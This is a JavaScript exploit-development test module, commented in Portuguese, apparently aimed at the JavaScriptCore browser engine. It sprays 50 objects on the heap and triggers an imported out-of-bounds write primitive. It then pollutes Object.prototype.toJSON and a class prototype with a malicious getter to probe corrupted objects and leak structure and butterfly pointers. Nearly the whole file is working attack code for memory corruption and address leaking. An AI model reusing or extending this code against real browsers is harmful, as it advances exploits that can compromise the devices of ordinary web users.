// js/script3/testMyComplexObjectGetterRepro.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute, // Precisaremos se pudermos obter um endereço
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs'; // Para JSC_OFFSETS

const GADGET_PROPERTY_NAME = "AAAA_GetterRepro";
export let getter_repro_called_flag = false;
export let getter_repro_this_id_logged = null;
export let getter_repro_this_marker_original = null;
export let getter_repro_this_marker_modified = null;
// Para armazenar dados lidos especulativamente de 'this'
export let getter_speculative_reads = {};

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`; // String
        this.value1 = 12345;     // Number (potential inline property)
        this.value2 = "initial_state"; // String
        this.marker = 0xCAFECAFE; // Number (potential inline property)
        this.anotherProperty = "clean_prop";
        this.propA = "valA";
        this.propB = 23456;
        this.propC = null;
        this.propD = { nested: "valD" }; // Object
        this.propE = [1,2,3];            // Array
        // Adicionar uma propriedade que poderia ser usada para vazar se 'this' fosse um ArrayBuffer
        this.potential_leak_slot = 0x41424344; // ABCD
    }
}

export function toJSON_TriggerGetterViaForIn() {
    const FNAME_toJSON = "toJSON_TriggerGetterViaForIn";
    let returned_payload = {
        _variant_: FNAME_toJSON,
        _id_at_entry_: (this && this.id !== undefined ? String(this.id) : "N/A"),
    };
    let iteration_count = 0;
    try {
        if (typeof this === 'object' && this !== null) {
            for (const prop in this) {
                iteration_count++;
                if (Object.prototype.hasOwnProperty.call(this, prop) || MyComplexObject.prototype.hasOwnProperty(prop)) {
                    if (typeof this[prop] !== 'function' || prop === GADGET_PROPERTY_NAME) {
                        returned_payload[prop] = this[prop];
                    }
                }
                if (iteration_count > 100) {
                    logS3(`[${FNAME_toJSON}] Loop excedeu 100 iterações. ID: ${this.id}`, "warn", FNAME_toJSON);
                    returned_payload._LOOP_BREAK_ = iteration_count;
                    break;
                }
            }
        } else {
            returned_payload._ERROR_ = "this is not an object or is null";
        }
    } catch (e) {
        logS3(`[${FNAME_toJSON}] ERRO no loop for...in: ${e.name} - ${e.message}`, "error", FNAME_toJSON);
        if (returned_payload) returned_payload._ERROR_IN_LOOP_ = `${e.name}: ${e.message}`;
    }
    if (returned_payload && iteration_count > 0) {
        returned_payload._iterations_ = iteration_count;
    }
    return returned_payload;
}

export async function executeGetterTriggerReproTest() {
    const FNAME_TEST = "executeGetterTriggerReproTest";
    logS3(`--- Iniciando Teste: Getter Expandido para Sondar 'this' ---`, "test", FNAME_TEST);
    document.title = `Repro MyComplex Getter - Probe 'this'`;

    getter_repro_called_flag = false;
    getter_repro_this_id_logged = null;
    getter_repro_this_marker_original = null;
    getter_repro_this_marker_modified = null;
    getter_speculative_reads = {}; // Resetar

    let originalGetterDescriptor = Object.getOwnPropertyDescriptor(MyComplexObject.prototype, GADGET_PROPERTY_NAME);
    let getterPollutionApplied = false;

    try {
        logS3(`Definindo getter '${GADGET_PROPERTY_NAME}' em MyComplexObject.prototype...`, 'info', FNAME_TEST);
        Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, {
            get: function() { // ESTE É O GETTER
                const GETTER_FNAME = "MyComplexObject_EvilGetter_Expanded";
                getter_repro_called_flag = true;
                getter_repro_this_id_logged = this.id;
                const current_reads = { id: this.id };

                logS3(`!!!! GETTER EXPANDIDO '${GADGET_PROPERTY_NAME}' FOI CHAMADO !!!! this.id: ${this.id}`, "vuln", GETTER_FNAME);

                try {
                    logS3(`   [${GETTER_FNAME}] Verificando 'this' (ID: ${this.id}):`, "info", GETTER_FNAME);
                    logS3(`     instanceof MyComplexObject: ${this instanceof MyComplexObject}`, "info", GETTER_FNAME);
                    current_reads.instanceof_MyComplexObject = this instanceof MyComplexObject;
                    logS3(`     Object.prototype.toString.call(this): ${Object.prototype.toString.call(this)}`, "info", GETTER_FNAME);
                    current_reads.toString_call_this = Object.prototype.toString.call(this);

                    getter_repro_this_marker_original = this.marker;
                    this.marker = 0xAC717EDD; // Modificar propriedade conhecida
                    getter_repro_this_marker_modified = this.marker;
                    logS3(`     'this.marker' modificado de ${toHex(getter_repro_this_marker_original)} para ${toHex(getter_repro_this_marker_modified)}`, "info", GETTER_FNAME);
                    current_reads.marker_original = toHex(getter_repro_this_marker_original);
                    current_reads.marker_modified = toHex(getter_repro_this_marker_modified);

                    // Tentativas especulativas de tratar 'this' como se fosse um ArrayBuffer/DataView
                    logS3(`   [${GETTER_FNAME}] Tentando acessar 'this' como ArrayBuffer/DataView (ID: ${this.id}):`, "info", GETTER_FNAME);
                    try {
                        logS3(`     this.byteLength: ${this.byteLength}`, "info", GETTER_FNAME);
                        current_reads.byteLength_prop = this.byteLength;
                    } catch (e_bl) {
                        logS3(`     ERRO ao ler this.byteLength: ${e_bl.message}`, "warn", GETTER_FNAME);
                        current_reads.byteLength_prop_error = e_bl.message;
                    }
                    try {
                        logS3(`     this.buffer: ${this.buffer}`, "info", GETTER_FNAME);
                        current_reads.buffer_prop = String(this.buffer); // Pode ser um objeto
                    } catch (e_b) {
                        logS3(`     ERRO ao ler this.buffer: ${e_b.message}`, "warn", GETTER_FNAME);
                        current_reads.buffer_prop_error = e_b.message;
                    }

                    // Tentar ler bytes brutos de 'this' usando métodos de DataView
                    // Esses offsets são especulativos, baseados em como um objeto JSCell pode ser.
                    // O JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET é o mais interessante.
                    const speculative_offsets_to_read = {
                        struct_ptr_offset: JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET || 0x8, // Onde esperamos o Structure*
                        butterfly_ptr_offset: JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET || 0x10,  // Onde esperamos o Butterfly*
                        inline_prop_val1_approx: 0x10, // Se value1 (number) estivesse inline após um cabeçalho de 16 bytes
                        inline_prop_marker_approx: 0x18, // Se marker (number) estivesse inline após value1
                    };

                    for (const key in speculative_offsets_to_read) {
                        const offset = speculative_offsets_to_read[key];
                        try {
                            // Tenta chamar getUint32/getBigUint64 como se 'this' fosse um DataView
                            // Isso é altamente especulativo e provavelmente causará TypeError
                            const val32 = this.getUint32(offset, true); // true for little-endian
                            logS3(`     SPECULATIVE READ from 'this' at offset ${toHex(offset)} (as Uint32LE): ${toHex(val32)}`, "leak", GETTER_FNAME);
                            current_reads[`read_offset_${toHex(offset)}_u32`] = toHex(val32);

                            // Tentar ler como 64-bit também (se getBigUint64 existisse diretamente, senão simular)
                            // Para simplificar, vamos nos ater a getUint32 por enquanto, a menos que você tenha getBigUint64
                            // Se o ponteiro da estrutura estiver em offset e tiver 8 bytes:
                            // const val64_low = this.getUint32(offset, true);
                            // const val64_high = this.getUint32(offset + 4, true);
                            // logS3(`     SPECULATIVE READ from 'this' at offset ${toHex(offset)} (as Uint64LE): ${toHex(val64_high)}${toHex(val64_low).substring(2)}`, "leak", GETTER_FNAME);
                            // current_reads[`read_offset_${toHex(offset)}_u64`] = `${toHex(val64_high)}${toHex(val64_low).substring(2)}`;

                        } catch (e_dv) {
                            logS3(`     ERRO ao tentar this.getUint32(${toHex(offset)}): ${e_dv.name} - ${e_dv.message}`, "warn", GETTER_FNAME);
                            current_reads[`read_offset_${toHex(offset)}_u32_error`] = e_dv.message;
                        }
                    }

                    // Tenta acessar uma propriedade que poderia ter sido sobrescrita por um ponteiro
                    // se a corrupção de '0x70' tivesse um efeito muito específico
                    try {
                        logS3(`     this.potential_leak_slot: ${toHex(this.potential_leak_slot)}`, "info", GETTER_FNAME);
                        current_reads.potential_leak_slot_val = toHex(this.potential_leak_slot);
                    } catch(e_pls) {
                         logS3(`     ERRO ao ler this.potential_leak_slot: ${e_pls.message}`, "warn", GETTER_FNAME);
                         current_reads.potential_leak_slot_error = e_pls.message;
                    }


                } catch (e_getter_main) {
                    logS3(`   [${GETTER_FNAME}] ERRO GERAL DENTRO DO GETTER (ID: ${this.id}): ${e_getter_main.name} - ${e_getter_main.message}`, "error", GETTER_FNAME);
                    current_reads.getter_internal_error = e_getter_main.message;
                }
                getter_speculative_reads = current_reads; // Armazena a última leitura
                return "value_returned_by_expanded_getter";
            },
            configurable: true,
            enumerable: true
        });
        getterPollutionApplied = true;
        logS3("Getter expandido definido com sucesso.", "good", FNAME_TEST);

    } catch (e_getter_setup) {
        logS3(`ERRO ao definir getter expandido: ${e_getter_setup.message}`, "error", FNAME_TEST);
        return { errorOccurred: e_getter_setup };
    }

    const spray_count = 50;
    const sprayed_objects = [];
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16;
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`Spray error: ${e_spray.message}`, "error", FNAME_TEST);
        if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
            if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
            else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        return { errorOccurred: e_spray };
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`2. Configurando OOB e escrevendo 0xFFFFFFFF em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("OOB setup error", "error", FNAME_TEST);
         if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
             if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
             else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        return { errorOccurred: new Error("OOB Setup Failed") };
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`OOB write error: ${e_write.message}`, "error", FNAME_TEST);
        clearOOBEnvironment();
        if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
            if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
            else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        }
        return { errorOccurred: e_write };
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`3. Sondando objetos pulverizados com ${toJSON_TriggerGetterViaForIn.name}...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected_summary = null;
    let first_successful_getter_reads = null;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerGetterViaForIn,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;

        const objectsToProbe = Math.min(sprayed_objects.length, 10);
        logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);
        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            getter_repro_called_flag = false; // Reset para este objeto
            getter_speculative_reads = {}; // Reset para este objeto

            const original_marker_before_stringify = obj.marker;

            document.title = `Sondando MyComplexObject ${i} (Probe This)`;
            let stringifyResult = null;
            let errorDuringStringify = null;

            logS3(`   Testando objeto ${i} (ID: ${obj.id}). Marker Original: ${toHex(original_marker_before_stringify)}`, 'info', FNAME_TEST);
            try {
                stringifyResult = JSON.stringify(obj);
                logS3(`     JSON.stringify(obj[${i}]) completou. Retorno da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
                 if (stringifyResult && stringifyResult._ERROR_IN_LOOP_) {
                    errorDuringStringify = new Error(stringifyResult._ERROR_IN_LOOP_);
                }
            } catch (e_str) {
                errorDuringStringify = e_str;
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
                if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }

            if (getter_repro_called_flag) {
                logS3(`   !!!! SUCESSO: Getter EXPANDIDO FOI CHAMADO para obj.id=${getter_repro_this_id_logged} (original index ${i})!!!!`, "vuln", FNAME_TEST);
                logS3(`        Leituras Especulativas do Getter: ${JSON.stringify(getter_speculative_reads)}`, "leak", FNAME_TEST);
                first_successful_getter_reads = getter_speculative_reads; // Salva as leituras do primeiro sucesso

                logS3(`        Objeto original (ID ${obj.id}) marker APÓS stringify: ${toHex(obj.marker)}`, "info", FNAME_TEST);
                if (obj.marker === 0xAC717EDD) {
                    logS3(`        CONFIRMADO: Objeto sprayed_objects[${i}] (ID: ${obj.id}) teve seu 'marker' modificado pelo getter e a modificação persistiu!`, "critical", FNAME_TEST);
                    document.title = `SUCCESS: Getter Expanded Called & Prop Modified on ${obj.id}!`;
                } else {
                    logS3(`        AVISO: Modificação do getter não persistiu ou foi sobrescrita. Original: ${toHex(original_marker_before_stringify)}, Getter setou para: ${toHex(getter_repro_this_marker_modified)}, Final: ${toHex(obj.marker)}`, "warn", FNAME_TEST);
                }
                problem_detected_summary = "Getter Expandido Acionado";
                break;
            }
            if (errorDuringStringify) {
                logS3(`   ERRO durante sondagem de obj[${i}]: ${errorDuringStringify.name} ${errorDuringStringify.message ? `- ${errorDuringStringify.message}`:''}`, "error", FNAME_TEST);
                problem_detected_summary = `Erro: ${errorDuringStringify.name}`;
                document.title = `ERROR ${errorDuringStringify.name} on ${obj.id}`;
                if (errorDuringStringify.name === 'RangeError') {
                    logS3("       RangeError ocorreu.", "warn", FNAME_TEST);
                }
                break;
            }
            await PAUSE_S3(SHORT_PAUSE_S3);
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
        problem_detected_summary = "Erro no Loop Principal";
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (getter_repro_called_flag) {
        logS3("Teste CONCLUÍDO: O Getter EXPANDIDO FOI ACIONADO!", "vuln", FNAME_TEST);
        if(first_successful_getter_reads) {
            logS3(`PRIMEIRAS LEITURAS DO GETTER BEM SUCEDIDO: ${JSON.stringify(first_successful_getter_reads, null, 2)}`, "critical", FNAME_TEST);
        }
    } else if (problem_detected_summary) {
        logS3(`Teste CONCLUÍDO: Um problema (${problem_detected_summary}) ocorreu durante a sondagem.`, "warn", FNAME_TEST);
    } else {
        logS3("Teste CONCLUÍDO: Getter expandido não acionado e nenhum erro óbvio.", "good", FNAME_TEST);
    }

    if (getterPollutionApplied && MyComplexObject.prototype.hasOwnProperty(GADGET_PROPERTY_NAME)) {
        if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
        else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        logS3(`Getter '${GADGET_PROPERTY_NAME}' restaurado/removido de MyComplexObject.prototype.`, "info", FNAME_TEST);
    }

    logS3(`--- Teste Getter Expandido para Sondar 'this' CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    document.title = getter_repro_called_flag ? document.title : (problem_detected_summary ? document.title : `Repro Probe 'this' Done`);
}
